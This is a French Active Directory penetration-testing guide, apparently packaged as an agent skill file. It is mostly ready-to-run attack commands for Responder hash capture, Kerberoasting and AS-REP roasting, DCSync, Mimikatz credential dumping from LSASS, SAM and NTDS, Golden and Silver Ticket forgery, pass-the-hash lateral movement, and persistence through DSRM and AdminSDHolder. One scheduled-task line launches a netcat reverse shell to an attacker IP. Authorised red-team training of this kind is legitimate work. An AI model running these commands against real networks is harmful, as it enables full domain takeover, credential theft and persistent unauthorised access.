---
name: active-directory
description: Guide complet pentest Active Directory — BloodHound, Impacket, CrackMapExec, Mimikatz, Responder, Kerberos, AS-REP, Kerberoasting, Golden Ticket, et workflow d'attaque complet.
---

# Pentest Active Directory — Guide Complet

---

## Vue d'ensemble

Active Directory est le service d'annuaire Microsoft présent dans 90%+ des
environnements d'entreprise. Sa compromission est l'objectif central de la
plupart des tests d'intrusion.

**Objectif ultime** : devenir Domain Admin (DA).

---

## Services et ports AD à connaître

| Port | Service | Utilité offensive |
|------|---------|-------------------|
| 53 | DNS | Énumération, exploitation de zone transfer |
| 88 | Kerberos | AS-REP roasting, Kerberoasting |
| 135 | MSRPC | Énumération RPC |
| 139/445 | SMB | Partage de fichiers, exploitation |
| 389/636 | LDAP(S) | Énumération de domaine |
| 3268/3269 | Global Catalog | LDAP global |
| 5985/5986 | WinRM | Remote management (Evil-WinRM) |
| 3389 | RDP | Bureau à distance |

---

## Phase 1 : Énumération initiale

### Nmap pour AD
```bash
nmap -p 53,88,135,139,389,445,636,3268,3389,5985 -sV -sC 10.0.0.0/24
```

### Enum4linux (énumération SMB)
```bash
enum4linux -a <IP_DC>
enum4linux -U <IP_DC>    # Liste des utilisateurs
enum4linux -S <IP_DC>    # Liste des partages
```

### LDAP anonymous bind
```bash
ldapsearch -H ldap://<DC_IP> -x -b "dc=domaine,dc=local"
ldapsearch -H ldap://<DC_IP> -x -b "dc=domaine,dc=local" "(objectClass=user)"
```

---

## Phase 2 : Attaques réseau internes

### Responder — LLMNR/NBT-NS/mDNS poisoning
```bash
# Lancer Responder sur l'interface réseau
responder -I eth0 -wv

# Analyser les hashes capturés (NTLMv2)
# Fichier : /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# Cracker les hashes
hashcat -m 5600 hash.txt rockyou.txt
john --format=netntlmv2 hash.txt --wordlist=rockyou.txt
```

### SCF / LNK file attack
```bash
# Créer un fichier .scf malveillant dans un partage ouvert
# Le poste client tente de charger l'icône → envoie son hash NTLM

# Avec CrackMapExec
crackmapexec smb 10.0.0.0/24 -u user -p pass -M scuffy -o NAME=WORK SERVER=<IP_RESPONDER>
```

---

## Phase 3 : CrackMapExec (CME) / NetExec (nxc)

### Énumération SMB
```bash
# Vérifier les partages accessibles
crackmapexec smb 10.0.0.0/24

# Lister les partages
crackmapexec smb 10.0.0.100 -u user -p pass --shares

# Lister les utilisateurs
crackmapexec smb 10.0.0.100 -u user -p pass --users

# Lister les groupes
crackmapexec smb 10.0.0.100 -u user -p pass --groups

# Bruteforce SMB (hash spraying)
crackmapexec smb 10.0.0.0/24 -u users.txt -H '<NTLM_HASH>'
```

### Pass-the-Hash (PtH)
```bash
crackmapexec smb 10.0.0.100 -u Administrator -H '<NTLM_HASH>' -x 'whoami'
crackmapexec winrm 10.0.0.100 -u Administrator -H '<NTLM_HASH>'
```

### Modules CME utiles
```bash
# Mimikatz
crackmapexec smb 10.0.0.100 -u admin -p pass -M mimikatz

# BloodHound (collecte)
crackmapexec smb 10.0.0.100 -u admin -p pass -M bloodhound -c all

# LSASS dump
crackmapexec smb 10.0.0.100 -u admin -p pass -M lsassy

# PetitPotam / PrintSpoofer
crackmapexec smb 10.0.0.100 -u admin -p pass -M petitpotam
```

---

## Phase 4 : BloodHound — Cartographie AD

### Collecte de données
```bash
# Depuis Kali (via Python)
bloodhound-python -d domaine.local -u user -p pass -ns <DC_IP> -c all

# Depuis un poste Windows compromis
# SharpHound.exe -c all -d domaine.local
# Invoke-BloodHound -CollectionMethod All -Domain domaine.local
```

### Démarrage
```bash
sudo neo4j start
bloodhound
# → Login : neo4j // neo4j (ou mot de passe défini)
# → Importer le zip de sortie
```

### Requêtes BloodHound essentielles
```
Shortest Path to Domain Admins
Find Principals with DCSync Rights
Find Computers where Domain Users are Local Admin
Shortest Paths from Kerberoastable Users
Find AS-REP Roastable Users (DontReqPreAuth)
Find All Paths to High Value Targets
```

---

## Phase 5 : Attaques Kerberos

### AS-REP Roasting
```bash
# Cibler les comptes sans pré-authentification Kerberos
impacket-GetNPUsers domaine.local/ -usersfile users.txt -dc-ip <DC_IP>
impacket-GetNPUsers domaine.local/user -no-pass -dc-ip <DC_IP>

# Cracker le TGT obtenu
hashcat -m 18200 asrep_hash.txt rockyou.txt
john --format=krb5tgs asrep_hash.txt --wordlist=rockyou.txt
```

### Kerberoasting
```bash
# Demander et extraire les TGS pour les SPNs
impacket-GetUserSPNs domaine.local/user:password -dc-ip <DC_IP>
impacket-GetUserSPNs domaine.local/user:password -dc-ip <DC_IP> -request

# Cracker les TGS
hashcat -m 13100 kerberoast_hash.txt rockyou.txt
```

### DCSync (réplication d'annuaire)
```bash
# Nécessite des droits : Domain Admin, Administrateurs, Replicating Directory Changes
impacket-secretsdump domaine.local/user:password@<DC_IP>
# Extrait : NTDS.dit (tous les hashs du domaine)

# Récupérer uniquement le hash KRBTGT
impacket-secretsdump domaine.local/user:password@<DC_IP> -just-dc-user krbtgt
```

---

## Phase 6 : Impacket — Boîte à outils AD

### Vue d'ensemble des outils
```bash
impacket-secretsdump    # Dump de secrets (SAM, LSA, NTDS)
impacket-psexec         # Shell via SMB Admin$
impacket-wmiexec        # Shell via WMI
impacket-smbexec        # Shell via SMB
impacket-dcomexec       # Shell via DCOM
impacket-atexec         # Exécution via planificateur de tâches
impacket-GetUserSPNs    # Kerberoasting
impacket-GetNPUsers     # AS-REP Roasting
impacket-ticketer       # Génération de tickets Kerberos
impacket-getTGT         # Demande de TGT
impacket-ntlmrelayx     # Relais NTLM
```

### Commandes de shell
```bash
# PsExec (SMB Admin$)
impacket-psexec domaine.local/admin:password@<IP>

# WMIExec (plus furtif, pas de service créé)
impacket-wmiexec domaine.local/admin:password@<IP>

# Avec hash NTLM (Pass-the-Hash)
impacket-wmiexec -hashes :<NTLM_HASH> domaine.local/admin@<IP>

# Dump de SAM
impacket-secretsdump admin:password@<IP>

# Dump avec hash
impacket-secretsdump -hashes :<NTLM_HASH> admin@<IP>
```

### Relais NTLM (ntlmrelayx)
```bash
# Écouter et relayer les authentifications NTLM
impacket-ntlmrelayx -tf targets.txt -smb2support

# Avec exécution de commande sur les cibles relayées
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# Dump SAM automatique
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
```

---

## Phase 7 : Mimikatz — Credential Dumping

### Commandes classiques
```bash
# Lancer Mimikatz sur la cible Windows
mimikatz.exe

# Extraire les credentials en mémoire
privilege::debug
sekurlsa::logonpasswords

# Dump du cache Kerberos
sekurlsa::tickets /export

# Pass-the-Ticket
kerberos::ptt ticket.kirbi

# Dump SAM
lsadump::sam

# Dump LSA secrets
lsadump::lsa /patch

# DCSync (depuis un poste avec droits)
lsadump::dcsync /domain:domaine.local /user:krbtgt
```

### Golden Ticket (persistance ultime)
```bash
# Avec Mimikatz (sur la cible)
kerberos::golden /user:Administrator /domain:domaine.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:500 /ptt

# Avec Impacket (depuis Kali)
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain domaine.local Administrator
```

### Silver Ticket (compromission de service spécifique)
```bash
# Ticket pour un service spécifique (ex: CIFS)
kerberos::golden /domain:domaine.local /sid:<DOMAIN_SID> /target:serveur.domaine.local /service:cifs /rc4:<NTLM_SERVICE> /user:admin /ptt
```

---

## Phase 8 : Mouvement latéral

### Evil-WinRM
```bash
evil-winrm -i <IP> -u admin -p password
evil-winrm -i <IP> -u admin -H '<NTLM_HASH>'
```

### PowerShell Remoting
```bash
Enter-PSSession -ComputerName <cible>
Invoke-Command -ComputerName <cible> -ScriptBlock { whoami }
```

### WMI
```bash
wmic /node:"<IP>" process call create "cmd.exe /c whoami"
```

### Scheduled Tasks
```bash
schtasks /create /s <cible> /tn "MaTache" /tr "cmd.exe /c nc.exe 10.0.0.5 4444 -e cmd.exe" /sc once /st 00:00
schtasks /run /s <cible> /tn "MaTache"
```

---

## Phase 9 : Persistance

### Golden Ticket
Déjà couvert ci-dessus — persistance à vie via KRBTGT

### DSRM (Directory Services Restore Mode)
```bash
# Modifier le mot de passe DSRM du DC
ntdsutil → set dsrm password → sync from domain account

# Pass-the-Hash DSRM
impacket-psexec -hashes :<DSRM_HASH> Administrateur@<DC_IP>
```

### AdminSDHolder (propagation permanente)
```bash
# Ajouter un groupe à AdminSDHolder → droits admin sur tous les objets privilégiés
Add-DomainObjectAcl -TargetIdentity "AdminSDHolder" -PrincipalIdentity "MonUser" -Rights All
```

---

## Cheatsheet rapide

```bash
# 1. Énumération
nmap -p 53,88,135,139,389,445,636,3268,3389,5985 -sV -sC <DC_IP>
crackmapexec smb <IP> --shares

# 2. BloodHound
bloodhound-python -d domaine.local -u user -p pass -ns <DC_IP> -c all

# 3. AS-REP Roasting
impacket-GetNPUsers domaine.local/ -usersfile users.txt -dc-ip <DC_IP>

# 4. Kerberoasting
impacket-GetUserSPNs domaine.local/user:pass -dc-ip <DC_IP> -request

# 5. DCSync (si DA)
impacket-secretsdump admin:pass@<DC_IP>

# 6. Pass-the-Hash
impacket-wmiexec -hashes :<HASH> admin@<IP>

# 7. Shell interactif
evil-winrm -i <IP> -u admin -H '<HASH>'
```

### Bibliographie
- HackTricks AD : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- PayloadsAllTheThings AD : https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Active%20Directory%20Attack/
- BloodHound : https://github.com/BloodHoundAD/BloodHound
- Impacket : https://github.com/fortra/impacket
- CrackMapExec : https://github.com/byt3bl33d3r/CrackMapExec